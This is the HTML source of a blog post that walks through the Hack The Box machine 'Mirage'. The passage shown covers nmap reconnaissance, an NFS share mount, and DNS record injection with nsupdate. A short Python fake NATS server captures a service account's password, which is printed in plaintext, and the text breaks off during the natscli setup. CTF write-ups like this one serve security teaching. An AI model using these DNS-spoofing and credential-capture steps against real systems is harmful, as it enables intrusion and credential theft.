@@ -1,0 +1,831 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2025/11/22/hackthebox-mirage/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewMirage is a hard-difficulty machine from Hack The Box dealing initially with: NFS share leak exposes internal docs → DNS spoofing via nsupdate lets you impersonate a service → Fake NATS server">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: Mirage">
+<meta property="og:url" content="http://fouedsaidi.com/2025/11/22/Hackthebox-Mirage/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewMirage is a hard-difficulty machine from Hack The Box dealing initially with: NFS share leak exposes internal docs → DNS spoofing via nsupdate lets you impersonate a service → Fake NATS server">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Mirage/Mirage.png">
+<meta property="article:published_time" content="2025-11-22T17:59:41.000Z">
+<meta property="article:modified_time" content="2025-11-22T18:03:46.269Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Mirage/Mirage.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: Mirage -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":null,"zhihu":null,"twitter":"https://twitter.com/_kujen5","email":null,"linkedin":"https://www.linkedin.com/in/foued-saidi-pro/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: Mirage</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-11-22 20:59:41</span>
+        <span class="mobile">2025-11-22 20:59:41</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-11-22 21:03:46</span>
+            <span class="mobile">2025-11-22 21:03:46</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Mirage is a hard-difficulty machine from Hack The Box dealing initially with: NFS share leak exposes internal docs → DNS spoofing via nsupdate lets you impersonate a service → Fake NATS server captures Dev_Account_A creds → JetStream log subscription reveals david.jjackson creds → Kerberos LDAP&#x2F;BloodHound recon maps privilege paths → Weak ACLs (GenericWrite&#x2F;WriteDACL&#x2F;AddKeyCredentialLink) → Privilege escalates to high-value domain access.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Mirage/Mirage.png"
+                      alt="Mirage-info-card"
+                ><figcaption>Mirage-info-card</figcaption></figure></p>
+<h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-23 18:10:01Z)</span><br><span class="line">111/tcp  open  rpcbind?</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100003  2,3         2049/udp   nfs</span><br><span class="line">|   100003  2,3         2049/udp6  nfs</span><br><span class="line">|   100003  2,3,4       2049/tcp   nfs</span><br><span class="line">|   100003  2,3,4       2049/tcp6  nfs</span><br><span class="line">|   100005  1,2,3       2049/tcp   mountd</span><br><span class="line">|   100005  1,2,3       2049/tcp6  mountd</span><br><span class="line">|   100005  1,2,3       2049/udp   mountd</span><br><span class="line">|   100005  1,2,3       2049/udp6  mountd</span><br><span class="line">|   100021  1,2,3,4     2049/tcp   nlockmgr</span><br><span class="line">|   100021  1,2,3,4     2049/tcp6  nlockmgr</span><br><span class="line">|   100021  1,2,3,4     2049/udp   nlockmgr</span><br><span class="line">|   100021  1,2,3,4     2049/udp6  nlockmgr</span><br><span class="line">|   100024  1           2049/tcp   status</span><br><span class="line">|   100024  1           2049/tcp6  status</span><br><span class="line">|   100024  1           2049/udp   status</span><br><span class="line">|_  100024  1           2049/udp6  status</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent time</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE</span><br><span class="line">| Not valid before: 2025-07-04T19:58:41</span><br><span class="line">|_Not valid after:  2105-07-04T19:58:41</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent time</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE</span><br><span class="line">| Not valid before: 2025-07-04T19:58:41</span><br><span class="line">|_Not valid after:  2105-07-04T19:58:41</span><br><span class="line">2049/tcp open  nlockmgr      1-4 (RPC <span class="comment">#100021)</span></span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent time</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE</span><br><span class="line">| Not valid before: 2025-07-04T19:58:41</span><br><span class="line">|_Not valid after:  2105-07-04T19:58:41</span><br><span class="line">3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE</span><br><span class="line">| Not valid before: 2025-07-04T19:58:41</span><br><span class="line">|_Not valid after:  2105-07-04T19:58:41</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent time</span><br><span class="line">5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.95%E=4%D=7/23%OT=53%CT=1%CU=38601%PV=Y%DS=2%DC=T%G=Y%TM=6880C3C</span><br><span class="line">OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=107%TI=I%CI=I%TS=A)SEQ(SP=1</span><br><span class="line">OS:04%GCD=1%ISR=108%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=105%GCD=1%ISR=109%TI=I%</span><br><span class="line">OS:CI=I%II=I%SS=S%TS=A)SEQ(SP=108%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS=A)SE</span><br><span class="line">OS:Q(SP=108%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=O%TS=A)OPS(O1=M542NW8ST11%O2=M5</span><br><span class="line">OS:42NW8ST11%O3=M542NW8NNT11%O4=M542NW8ST11%O5=M542NW8ST11%O6=M542ST11)WIN(</span><br><span class="line">OS:W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF</span><br><span class="line">OS:%O=M542NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R</span><br><span class="line">OS:=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%</span><br><span class="line">OS:A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)</span><br><span class="line">OS:U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%D</span><br><span class="line">OS:FI=N%T=80%CD=Z)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2025-07-23T18:11:20</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_clock-skew: 6h59m59s</span><br></pre></td></tr></table></figure></div>
+
+<p>We can see a very interesting RPC port exposing multiple methods.</p>
+<p>We have rpc ports, we can mount them:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(base) ┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ showmount -e 10.129.104.218</span><br><span class="line">Export list <span class="keyword">for</span> 10.129.104.218:</span><br><span class="line">/MirageReports (everyone)</span><br><span class="line"></span><br><span class="line">(base) ┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo mount -t nfs 10.129.104.218:/MirageReports /tmp/nfs</span><br><span class="line">                                                                                                                                                                                                                   </span><br><span class="line">(base) ┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ <span class="built_in">cd</span> /tmp/nfs</span><br><span class="line">                                                                                                                                                                                                                   </span><br><span class="line">(base) ┌──(kali㉿kali)-[/tmp/nfs]</span><br><span class="line">└─$ <span class="built_in">ls</span></span><br><span class="line">Incident_Report_Missing_DNS_Record_nats-svc.pdf  Mirage_Authentication_Hardening_Report.pdf</span><br><span class="line">                                                                                    </span><br></pre></td></tr></table></figure></div>
+
+<p>Reading the DOC, we can see that <code>nats-svc.mirage.htb</code> is missing in DNS and the environment enforces Kerberos. We might be able to <strong>abuse DNS updates</strong> to redirect that service name to our attacking machine</p>
+<p>The default port for nats is 4222.</p>
+<p>We need to listen to your 4222 port (the default port of the NATS server) and send an INFO message. Then use nsupdate to add a DNS record pointing to our own machine from the target machine. Wait a few seconds and we will receive a CONNECT message from the target machine.</p>
+<p>If we do not send an INFO message to greet the target, we will not be able to receive the CONNECT message sent by the target. <code>nsupdate</code> is only used to trigger the target machine to access your 4222 port:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">(base) ┌──(kali㉿kali)-[/tmp]</span><br><span class="line">└─$ nsupdate         </span><br><span class="line">&gt; server 10.129.104.218</span><br><span class="line">&gt; update add nats-svc.mirage.htb 3600 A 10.10.16.3</span><br><span class="line">&gt; send</span><br><span class="line">&gt; </span><br><span class="line"></span><br><span class="line">(base) ┌──(kali㉿kali)-[/tmp]</span><br><span class="line">└─$ python3 fake_nats.py</span><br><span class="line">[+] Started</span><br><span class="line">[+] Connection from (<span class="string">&#x27;10.129.104.218&#x27;</span>, 56569)</span><br><span class="line">[&gt;] Received:</span><br><span class="line">CONNECT &#123;<span class="string">&quot;verbose&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;pedantic&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;user&quot;</span>:<span class="string">&quot;Dev_Account_A&quot;</span>,<span class="string">&quot;pass&quot;</span>:<span class="string">&quot;hx5h7F5554fP@1337!&quot;</span>,<span class="string">&quot;tls_required&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;NATS CLI Version 0.2.2&quot;</span>,<span class="string">&quot;lang&quot;</span>:<span class="string">&quot;go&quot;</span>,<span class="string">&quot;version&quot;</span>:<span class="string">&quot;1.41.1&quot;</span>,<span class="string">&quot;protocol&quot;</span>:1,<span class="string">&quot;echo&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;headers&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;no_responders&quot;</span>:<span class="literal">false</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(base) ┌──(kali㉿kali)-[/tmp]</span><br><span class="line">└─$ <span class="built_in">cat</span> fake_nats.py </span><br><span class="line">import socket</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Started&quot;</span>)</span><br><span class="line">s = socket.socket()</span><br><span class="line">s.bind((&quot;<span class="number">0.0</span>.<span class="number">0.0</span>&quot;, <span class="number">4222</span>))</span><br><span class="line">s.listen(5)</span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    client, addr = s.accept()</span><br><span class="line">    <span class="built_in">print</span>(f<span class="string">&quot;[+] Connection from &#123;addr&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    client.sendall(b<span class="string">&#x27;INFO &#123;&quot;server_id&quot;:&quot;FAKE&quot;,&quot;version&quot;:&quot;2.11.0&quot;,&quot;auth_required&quot;:true&#125;\r\n&#x27;</span>)</span><br><span class="line">    data = client.recv(1024)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[&gt;] Received:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(data.decode())</span><br><span class="line">    client.close()</span><br></pre></td></tr></table></figure></div>
+
+<p><code>Dev_Account_A:hx5h7F5554fP@1337!</code></p>
+<p>We now install and configure <code>natscli</code> to interact using the credentials we captured:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(base) ┌──(kali㉿kali)-[~/natscli/nats]</span><br><span class="line">└─$ ./nats context add dev-nats \</span><br><span class="line">  --server nats://dc01.mirage.htb:4222 \</span><br><span class="line">  --user Dev_Account_A \</span><br><span class="line">  --password <span class="string">&#x27;hx5h7F5554fP@1337!&#x27;</span> \</span><br><span class="line">  --description <span class="string">&quot;Dev access&quot;</span></span><br><span class="line">NATS Configuration Context <span class="string">&quot;dev-nats&quot;</span></span><br><span class="line"></span><br><span class="line">  Description: Dev access</span><br><span class="line">  Server URLs: nats://dc01.mirage.htb:4222</span><br><span class="line">     Username: Dev_Account_A</span><br><span class="line">     Password: ******************</span><br><span class="line">         Path: /home/kali/.config/nats/context/dev-nats.json</span><br></pre></td></tr></table></figure></div>
+
+<p>Then subscribe to all messages<br>use the <code>jetstream</code> stream management option to to view the only stream:</p>
